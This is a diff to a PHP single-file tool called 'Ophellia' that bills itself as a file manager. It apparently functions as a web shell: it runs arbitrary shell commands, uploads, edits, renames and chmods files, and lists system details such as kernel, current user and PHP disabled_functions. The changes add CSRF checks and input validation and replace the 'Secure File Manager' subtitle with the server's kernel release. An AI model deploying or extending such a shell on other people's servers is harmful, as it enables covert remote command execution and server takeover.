             'fileTableHtml' => renderFileTable($dirname)
-        ]);
-    } else {
-        header('Content-Type: application/json');
-        echo json_encode([
-            'success' => false,
-            'message' => 'Delete failed: Authentication required'
         ]);
     }
     exit;
 }
 
 if (isset($_POST['ajax_rename'])) {
-    if (authenticate()) {
-        $file = decryptPath($_POST['path']);
+    ajaxGuard();
+    {
+        $file = decryptPath($_POST['path'] ?? '');
         $dirname = dirname($file);
-        $newname = $_POST['newname'] ?? '';
+        $newname = is_string($_POST['newname'] ?? null) ? $_POST['newname'] : '';
 
-        if (empty($newname)) {
-            header('Content-Type: application/json');
-            echo json_encode([
+        if (!validSimpleName($newname)) {
+            jsonRespond([
                 'success' => false,
-                'message' => 'Rename failed: New name cannot be empty'
+                'message' => 'Rename failed: the new name cannot be empty or contain path separators (/ or \\)'
             ]);
-            exit;
         }
 
         $newPath = $dirname . DIRECTORY_SEPARATOR . $newname;
-        $success = rename($file, $newPath);
+        $success = $file !== '' && @rename($file, $newPath);
         $isDir = is_dir($newPath);
         $type = $isDir ? "Directory" : "File";
 
-        header('Content-Type: application/json');
-        echo json_encode([
+        jsonRespond([
             'success' => $success,
             'message' => $success ? "$type renamed successfully" : "Rename failed: Could not rename $type",
             'fileTableHtml' => renderFileTable($dirname)
-        ]);
-    } else {
-        header('Content-Type: application/json');
-        echo json_encode([
-            'success' => false,
-            'message' => 'Rename failed: Authentication required'
         ]);
     }
     exit;
 }
 
 if (isset($_POST['ajax_chmod'])) {
-    if (authenticate()) {
-        $file = decryptPath($_POST['path']);
+    ajaxGuard();
+    {
+        $file = decryptPath($_POST['path'] ?? '');
         $dirname = dirname($file);
-        $permission = $_POST['permission'] ?? '';
+        $permission = is_string($_POST['permission'] ?? null) ? $_POST['permission'] : '';
 
         if (!preg_match('/^[0-7]{3,4}$/', $permission)) {
-            header('Content-Type: application/json');
-            echo json_encode([
+            jsonRespond([
                 'success' => false,
                 'message' => 'Chmod failed: Invalid permission format'
             ]);
-            exit;
         }
 
-        $success = chmod($file, octdec($permission));
+        $success = $file !== '' && @chmod($file, octdec($permission));
 
-        header('Content-Type: application/json');
-        echo json_encode([
+        jsonRespond([
             'success' => $success,
             'message' => $success ? "Permissions changed successfully" : "Chmod failed: Could not change permissions",
             'fileTableHtml' => renderFileTable($dirname)
-        ]);
-    } else {
-        header('Content-Type: application/json');
-        echo json_encode([
-            'success' => false,
-            'message' => 'Chmod failed: Authentication required'
         ]);
     }
     exit;
 }
 
 if (isset($_POST['ajax_newfile'])) {
-    if (authenticate()) {
-        $dir = decryptPath($_POST['path']);
-        $filename = $_POST['filename'] ?? '';
-        $content = $_POST['content'] ?? '';
+    ajaxGuard();
+    {
+        $dir = decryptPath($_POST['path'] ?? '');
+        $filename = is_string($_POST['filename'] ?? null) ? $_POST['filename'] : '';
+        $content = is_string($_POST['content'] ?? null) ? $_POST['content'] : '';
 
-        if (empty($filename)) {
-            header('Content-Type: application/json');
-            echo json_encode([
+        if (!validSimpleName($filename)) {
+            jsonRespond([
                 'success' => false,
-                'message' => 'Create file failed: Filename cannot be empty'
+                'message' => 'Create file failed: the filename cannot be empty or contain path separators (/ or \\)'
             ]);
-            exit;
+        }
+
+        if ($dir === '' || !is_dir($dir)) {
+            jsonRespond([
+                'success' => false,
+                'message' => 'Create file failed: target directory does not exist'
+            ]);
         }
 
         $filepath = $dir . DIRECTORY_SEPARATOR . $filename;
-        $success = file_put_contents($filepath, $content) !== false;
+        $success = @file_put_contents($filepath, $content) !== false;
 
-        header('Content-Type: application/json');
-        echo json_encode([
+        jsonRespond([
             'success' => $success,
-            'message' => $success ? "File created successfully" : "Create file failed: Could not create file",
+            'message' => $success ? "File created successfully" : "Create file failed: Could not create file (is the directory writable?)",
             'fileTableHtml' => renderFileTable($dir)
-        ]);
-    } else {
-        header('Content-Type: application/json');
-        echo json_encode([
-            'success' => false,
-            'message' => 'Create file failed: Authentication required'
         ]);
     }
     exit;
 }
 
 if (isset($_POST['ajax_newfolder'])) {
-    if (authenticate()) {
-        $dir = decryptPath($_POST['path']);
-        $foldername = $_POST['foldername'] ?? '';
+    ajaxGuard();
+    {
+        $dir = decryptPath($_POST['path'] ?? '');
+        $foldername = is_string($_POST['foldername'] ?? null) ? $_POST['foldername'] : '';
 
-        if (empty($foldername)) {
-            header('Content-Type: application/json');
-            echo json_encode([
+        if (!validSimpleName($foldername)) {
+            jsonRespond([
                 'success' => false,
-                'message' => 'Create folder failed: Folder name cannot be empty'
+                'message' => 'Create folder failed: the folder name cannot be empty or contain path separators (/ or \\)'
             ]);
-            exit;
+        }
+
+        if ($dir === '' || !is_dir($dir)) {
+            jsonRespond([
+                'success' => false,
+                'message' => 'Create folder failed: target directory does not exist'
+            ]);
         }
 
         $folderpath = $dir . DIRECTORY_SEPARATOR . $foldername;
-        $success = mkdir($folderpath, 0755, true);
+        $success = @mkdir($folderpath, 0755);
 
-        header('Content-Type: application/json');
-        echo json_encode([
+        jsonRespond([
             'success' => $success,
-            'message' => $success ? "Folder created successfully" : "Create folder failed: Could not create folder",
+            'message' => $success ? "Folder created successfully" : "Create folder failed: Could not create folder (already exists or not writable)",
             'fileTableHtml' => renderFileTable($dir)
-        ]);
-    } else {
-        header('Content-Type: application/json');
-        echo json_encode([
-            'success' => false,
-            'message' => 'Create folder failed: Authentication required'
         ]);
     }
     exit;
 }
 
 if (isset($_POST['ajax_command'])) {
-    if (authenticate()) {
-        $dir = decryptPath($_POST['path']);
-        $command = $_POST['command'] ?? '';
+    ajaxGuard();
+    {
+        $dir = decryptPath($_POST['path'] ?? '');
+        $command = is_string($_POST['command'] ?? null) ? $_POST['command'] : '';
 
-        if (empty($command)) {
-            header('Content-Type: application/json');
-            echo json_encode([
+        if (trim($command) === '') {
+            jsonRespond([
                 'success' => false,
                 'message' => 'Command failed: Command cannot be empty'
             ]);
-            exit;
         }
 
-        chdir($dir);
+        if ($dir !== '' && is_dir($dir)) {
+            @chdir($dir);
+        }
+
         $output = getFunctionalCmd($command);
 
-        header('Content-Type: application/json');
-        echo json_encode([
+        jsonRespond([
             'success' => true,
             'output' => $output
-        ]);
-    } else {
-        header('Content-Type: application/json');
-        echo json_encode([
-            'success' => false,
-            'message' => 'Command failed: Authentication required'
         ]);
     }
     exit;
 }
 
 if (isset($_POST['ajax_upload'])) {
-    header('Content-Type: application/json');
+    ajaxGuard();
+    {
+        $uploadToRoot = isset($_POST['upload_to_root']) && $_POST['upload_to_root'] === '1';
+        $rootPath = getcwd();
+        $targetDir = $uploadToRoot ? $rootPath : decryptPath($_POST['path'] ?? '');
 
-    if (!authenticate()) {
-        echo json_encode([
-            'success' => false,
-            'message' => 'Upload failed: Authentication required'
-        ]);
-        exit;
-    }
+        if ($targetDir === '' || !is_dir($targetDir) || !is_writable($targetDir)) {
+            jsonRespond([
+                'success' => false,
+                'message' => 'Upload failed: Target directory is not writable'
+            ]);
+        }
 
-    $uploadToRoot = isset($_POST['upload_to_root']) && $_POST['upload_to_root'] === '1';
-    $rootPath = getcwd();
-    $targetDir = $uploadToRoot ? $rootPath : decryptPath($_POST['path'] ?? $rootPath);
+        if (!isset($_FILES['file']) || !is_array($_FILES['file']) || ($_FILES['file']['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) {
+            $error = $_FILES['file']['error'] ?? UPLOAD_ERR_NO_FILE;
+            $errorMsg = [
+                UPLOAD_ERR_INI_SIZE => 'File exceeds server size limit',
+                UPLOAD_ERR_FORM_SIZE => 'File exceeds form size limit',
+                UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
+                UPLOAD_ERR_NO_FILE => 'No file was selected',
+                UPLOAD_ERR_NO_TMP_DIR => 'Server missing temporary folder',
+                UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
+                UPLOAD_ERR_EXTENSION => 'Upload blocked by server extension'
+            ][$error] ?? 'Unknown upload error';
 
-    if (!is_dir($targetDir) || !is_writable($targetDir)) {
-        echo json_encode([
-            'success' => false,
-            'message' => 'Upload failed: Target directory is not writable'
-        ]);
-        exit;
-    }
+            jsonRespond([
+                'success' => false,
+                'message' => 'Upload failed: ' . $errorMsg
+            ]);
+        }
 
-    if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
-        $error = $_FILES['file']['error'] ?? UPLOAD_ERR_NO_FILE;
-        $errorMsg = [
-            UPLOAD_ERR_INI_SIZE => 'File exceeds server size limit',
-            UPLOAD_ERR_FORM_SIZE => 'File exceeds form size limit',
-            UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
-            UPLOAD_ERR_NO_FILE => 'No file was selected',
-            UPLOAD_ERR_NO_TMP_DIR => 'Server missing temporary folder',
-            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
-            UPLOAD_ERR_EXTENSION => 'Upload blocked by server extension'
-        ][$error] ?? 'Unknown upload error';
-
-        echo json_encode([
-            'success' => false,
-            'message' => 'Upload failed: ' . $errorMsg
-        ]);
-        exit;
-    }
-
-    $filename = basename($_FILES['file']['name']);
-    $targetPath = $targetDir . '/' . $filename;
-
-    if (file_exists($targetPath)) {
-        $name = pathinfo($filename, PATHINFO_FILENAME);
-        $ext = pathinfo($filename, PATHINFO_EXTENSION);
-        $filename = $name . '_' . time() . '.' . $ext;
+        $filename = basename((string) $_FILES['file']['name']);
         $targetPath = $targetDir . '/' . $filename;
-    }
 
-    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
-        echo json_encode([
-            'success' => true,
-            'message' => 'File uploaded successfully: ' . $filename,
-            'fileTableHtml' => renderFileTable($targetDir)
-        ]);
-    } else {
-        echo json_encode([
-            'success' => false,
-            'message' => 'Upload failed: Could not save file to destination'
-        ]);
+        if (file_exists($targetPath)) {
+            $name = pathinfo($filename, PATHINFO_FILENAME);
+            $ext = pathinfo($filename, PATHINFO_EXTENSION);
+            $filename = $ext !== '' && $ext !== false
+                ? $name . '_' . time() . '.' . $ext
+                : $name . '_' . time();
+            $targetPath = $targetDir . '/' . $filename;
+        }
+
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
+            jsonRespond([
+                'success' => true,
+                'message' => 'File uploaded successfully: ' . $filename,
+                'fileTableHtml' => renderFileTable($targetDir)
+            ]);
+        } else {
+            jsonRespond([
+                'success' => false,
+                'message' => 'Upload failed: Could not save file to destination'
+            ]);
+        }
     }
     exit;
 }
 
 if (isset($_POST['ajax_info'])) {
-    header('Content-Type: application/json');
+    ajaxGuard();
+    {
+        try {
+            $info = [];
 
-    if (!authenticate()) {
-        echo json_encode([
-            'success' => false,
-            'message' => 'Info failed: Authentication required'
-        ]);
-        exit;
-    }
+            $safeMode = ini_get('safe_mode');
+            $info['php'] = [
+                'version' => PHP_VERSION,
+                'sapi' => php_sapi_name(),
+                'extensions' => get_loaded_extensions(),
+                'ini_path' => php_ini_loaded_file() ?: 'N/A',
+                'memory_limit' => ini_get('memory_limit') ?: 'N/A',
+                'max_execution_time' => ini_get('max_execution_time') ?: '0',
+                'upload_max_filesize' => ini_get('upload_max_filesize') ?: 'N/A',
+                'post_max_size' => ini_get('post_max_size') ?: 'N/A',
+                'display_errors' => ini_get('display_errors') ?: '0',
+                'error_reporting' => error_reporting(),
+                'safe_mode' => $safeMode && $safeMode !== '' && $safeMode !== '0' ? 'On' : 'Off',
+            ];
 
-    try {
-        $info = [];
+            $info['server'] = [
+                'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
+                'name' => $_SERVER['SERVER_NAME'] ?? 'N/A',
+                'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'N/A',
+                'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
+                'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
+                'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
+            ];
 
-        $safeMode = ini_get('safe_mode');
-        $info['php'] = [
-            'version' => PHP_VERSION,
-            'sapi' => php_sapi_name(),
-            'extensions' => get_loaded_extensions(),
-            'ini_path' => php_ini_loaded_file() ?: 'N/A',
-            'memory_limit' => ini_get('memory_limit') ?: 'N/A',
-            'max_execution_time' => ini_get('max_execution_time') ?: '0',
-            'upload_max_filesize' => ini_get('upload_max_filesize') ?: 'N/A',
-            'post_max_size' => ini_get('post_max_size') ?: 'N/A',
-            'display_errors' => ini_get('display_errors') ?: '0',
-            'error_reporting' => error_reporting(),
-            'safe_mode' => $safeMode && $safeMode !== '' && $safeMode !== '0' ? 'On' : 'Off',
-        ];
+            $uname = @php_uname('a') ?: 'N/A';
+            $kernelParts = explode(' ', $uname);
+            $kernel = isset($kernelParts[2]) ? $kernelParts[2] : ($kernelParts[0] ?? 'N/A');
 
-        $info['server'] = [
-            'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
-            'name' => $_SERVER['SERVER_NAME'] ?? 'N/A',
-            'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'N/A',
-            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
-            'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
-            'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
-        ];
+            $info['system'] = [
+                'os' => PHP_OS,
+                'os_family' => defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS,
+                'hostname' => @gethostname() ?: 'N/A',
+                'uname' => $uname,
+                'kernel' => $kernel,
+                'current_user' => @get_current_user() ?: 'N/A',
+                'current_dir' => @getcwd() ?: 'N/A',
+                'temp_dir' => @sys_get_temp_dir() ?: 'N/A',
+            ];
 
-        $uname = @php_uname('a') ?: 'N/A';
-        $kernelParts = explode(' ', $uname);
-        $kernel = isset($kernelParts[2]) ? $kernelParts[2] : ($kernelParts[0] ?? 'N/A');
+            $diskTotal = @disk_total_space('/');
+            $diskFree = @disk_free_space('/');
+            $info['disk'] = [
+                'total' => $diskTotal ? formatSize((int) $diskTotal) : 'N/A',
+                'free' => $diskFree ? formatSize((int) $diskFree) : 'N/A',
+            ];
 
-        $info['system'] = [
-            'os' => PHP_OS,
-            'os_family' => defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS,
-            'hostname' => @gethostname() ?: 'N/A',
-            'uname' => $uname,
-            'kernel' => $kernel,
-            'current_user' => @get_current_user() ?: 'N/A',
-            'current_dir' => @getcwd() ?: 'N/A',
-            'temp_dir' => @sys_get_temp_dir() ?: 'N/A',
-        ];
+            $dbExtensions = ['mysqli', 'pdo_mysql', 'pgsql', 'pdo_pgsql', 'sqlite3', 'pdo_sqlite', 'mongodb'];
+            $info['databases'] = array_values(array_filter($dbExtensions, 'extension_loaded'));
 
-        $diskTotal = @disk_total_space('/');
-        $diskFree = @disk_free_space('/');
-        $info['disk'] = [
-            'total' => $diskTotal ? formatSize((int) $diskTotal) : 'N/A',
-            'free' => $diskFree ? formatSize((int) $diskFree) : 'N/A',
-        ];
+            $disabledFunctions = ini_get('disable_functions');
+            $info['disabled_functions'] = $disabledFunctions ? array_map('trim', explode(',', $disabledFunctions)) : [];
 
-        $dbExtensions = ['mysqli', 'pdo_mysql', 'pgsql', 'pdo_pgsql', 'sqlite3', 'pdo_sqlite', 'mongodb'];
-        $info['databases'] = array_values(array_filter($dbExtensions, 'extension_loaded'));
-
-        $disabledFunctions = ini_get('disable_functions');
-        $info['disabled_functions'] = $disabledFunctions ? array_map('trim', explode(',', $disabledFunctions)) : [];
-
-        echo json_encode([
-            'success' => true,
-            'info' => $info
-        ]);
-    } catch (Exception $e) {
-        echo json_encode([
-            'success' => false,
-            'message' => 'Error: ' . $e->getMessage()
-        ]);
+            jsonRespond([
+                'success' => true,
+                'info' => $info
+            ]);
+        } catch (Exception $e) {
+            jsonRespond([
+                'success' => false,
+                'message' => 'Error: ' . $e->getMessage()
+            ]);
+        }
     }
     exit;
 }
-
-if (isset($_GET['download'])) {
-    $file = decryptPath($_GET['download']);
-    downloadFile($file);
-    exit;
-}
-
 if (!authenticate()) {
     $loginTheme = THEME === 'dark' ? [
         'bg' => '#1A110F',
@@ -1313,13 +948,58 @@ if (!authenticate()) {
     exit;
 }
 
-$currentDir = isset($_GET['cd']) ? decryptPath($_GET['cd']) : getcwd();
-if (!file_exists($currentDir) || !is_dir($currentDir)) {
-    $currentDir = getcwd();
+if (isset($_GET['download'])) {
+    downloadFile(decryptPath($_GET['download']));
+    exit;
 }
 
-$currentUser = getCurrentUser();
-$currentTime = date('Y-m-d H:i:s');
+if (isset($_GET['action'], $_GET['file'])) {
+    $targetFile = decryptPath($_GET['file']);
+
+    if ($targetFile !== '' && is_dir($targetFile) && in_array($_GET['action'], ['view', 'edit'], true)) {
+        header('Location: ?cd=' . encryptPath($targetFile));
+        exit;
+    }
+
+    if ($_GET['action'] === 'edit' && isset($_POST['content']) && $targetFile !== '' && is_file($targetFile)) {
+        if (!csrfOk()) {
+            $alertMessages = [];
+            showAlert("Invalid session token. Please reload the page and try again.", "error");
+            stashAlerts();
+            header('Location: ?cd=' . encryptPath(dirname($targetFile)));
+            exit;
+        }
+
+        $content = is_string($_POST['content']) ? $_POST['content'] : '';
+        $saved = @file_put_contents($targetFile, $content) !== false;
+
+        $alertMessages = [];
+        showAlert(
+            $saved ? "File saved successfully!" : "Failed to save file: it may not be writable.",
+            $saved ? "success" : "error"
+        );
+        stashAlerts();
+        header('Location: ?cd=' . encryptPath(dirname($targetFile)));
+        exit;
+    }
+}
+
+$currentDir = getcwd();
+
+if (isset($_GET['cd'])) {
+    $cd = decryptPath($_GET['cd']);
+    if ($cd !== '' && is_dir($cd)) {
+        $currentDir = $cd;
+    }
+} elseif (isset($_GET['file']) && in_array($_GET['action'] ?? '', ['view', 'edit'], true)) {
+    $target = decryptPath($_GET['file']);
+    if ($target !== '') {
+        $parent = dirname($target);
+        if (is_dir($parent)) {
+            $currentDir = $parent;
+        }
+    }
+}
 
 ?>
 <!DOCTYPE html>
@@ -1333,6 +1013,7 @@ $currentTime = date('Y-m-d H:i:s');
     </title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="ophellia.css">
+    <script>window.CSRF_TOKEN = <?= json_encode(csrfToken()) ?>;</script>
     <?php
     $themeColors = THEME === 'dark' ? [
         'background' => '#1A110F',
@@ -1492,7 +1173,7 @@ $currentTime = date('Y-m-d H:i:s');
                                 class="opacity-75 font-normal text-primary">
                                 <?= VERSION ?>
                             </span></h1>
-                        <p class="text-xs text-on-surface-variant hidden sm:block">Secure File Manager</p>
+                        <p class="text-xs text-on-surface-variant hidden sm:block font-mono truncate max-w-md" title="<?= htmlspecialchars(@php_uname('r') ?: '') ?>"><?= htmlspecialchars(@php_uname('r') ?: PHP_OS) ?></p>
                     </div>
                 </div>
                 <div class="flex items-center gap-4 text-sm">
